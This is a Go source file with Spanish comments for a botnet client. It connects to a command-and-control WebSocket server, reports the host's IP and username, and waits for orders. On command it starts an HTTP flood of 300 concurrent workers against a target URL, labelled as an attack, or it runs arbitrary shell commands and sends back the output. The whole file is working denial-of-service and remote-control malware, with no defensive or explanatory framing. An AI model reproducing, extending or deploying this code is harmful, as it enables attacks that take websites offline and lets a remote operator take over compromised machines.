package main

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ClientInfo struct {
	IP       string `json:"ip"`
	MAC      string `json:"mac"`
	Username string `json:"username"`
}

var (
	CENTRALITA_IP = "ws://192.168.1.103:42069/ws" // TODO: cambiar esta patraña
	cancelFunc    context.CancelFunc

	// cosas de intensidad
	concurrencia = 300
)

func StressConnections(ctx context.Context, url string, concurrency int) {
	tr := &http.Transport{
		MaxIdleConns:        concurrency * 4,
		MaxIdleConnsPerHost: concurrency,
		DisableKeepAlives:   false,
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}

	var wg sync.WaitGroup

	worker := func() {
		defer wg.Done()

		ticker := time.NewTicker(10 * time.Millisecond) // agresividad aqui
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return

			case <-ticker.C:
				resp, err := client.Get(url)
				if err == nil {
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
				}
			}
		}
	}

	wg.Add(concurrency)
	for i := 0; i < concurrency; i++ {
		go worker()
	}

	wg.Wait()
}

func getLocalIP() string {
	addrs, _ := net.InterfaceAddrs()
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			return ipnet.IP.String()
		}
	}
	return "unknown"
}

func executeShellCommand(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func main() {
	wsURL := CENTRALITA_IP

	for {
		conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		info := ClientInfo{
			IP: getLocalIP(),
			// TODO: añadir lo de la mac
			MAC:      "00:11:22:33:44:55",
			Username: os.Getenv("USER"),
		}
		conn.WriteJSON(info)

		for {
			var msg map[string]string
			if err := conn.ReadJSON(&msg); err != nil {
				if cancelFunc != nil {
					cancelFunc()
				}
				conn.Close()
				break
			}

			// =======================
			// 	aqui van las ordenes que se pueden recibir de la centralita
			switch msg["action"] {
			case "START":
				if cancelFunc != nil {
					cancelFunc()
				}
				fmt.Println("atacando ", msg["payload"])
				ctx, cancel := context.WithCancel(context.Background())
				cancelFunc = cancel

				go StressConnections(ctx, msg["payload"], concurrencia)

			case "STOP":
				if cancelFunc != nil {
					cancelFunc()
					cancelFunc = nil
					fmt.Println("se para")
				}

			case "SHELL":
				command := msg["payload"]
				fmt.Printf("ejecutando: %s\n", command)

				output, err := executeShellCommand(command)
				if err != nil {
					output = fmt.Sprintf("error: %v", err)
				}

				// enviamos la respuesta, realmente no es un shell
				response := map[string]string{
					"action":  "SHELL_RESULT",
					"payload": output,
				}

				if err := conn.WriteJSON(response); err != nil {
					fmt.Println("error de envío:", err)
				}

			}
		}
	}
}
